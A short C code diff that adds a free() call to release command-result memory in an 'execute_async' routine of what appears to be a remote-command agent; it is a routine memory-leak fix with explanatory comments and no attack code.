@@ -125,6 +125,7 @@ DWORD WINAPI execute_async(char * agent_id)
 
     //Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
     free(OutboundJsonData->agent_id); //freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
+    free(OutboundJsonData->command_result_data); //freeing due to set_response_data function in whipser_commands.h
     free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
 
